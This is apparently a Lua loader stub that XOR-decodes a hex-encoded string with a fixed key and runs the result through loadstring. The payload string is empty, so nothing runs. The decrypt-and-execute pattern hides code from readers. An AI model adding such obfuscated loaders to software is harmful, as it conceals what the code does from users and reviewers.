local k={116,25,241,179,126,87,87,60,141,138,194,152,211,135,49,215,246,125,73,140,108,53,250,149,106,44,140,21,125,102,146,37}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
fn()
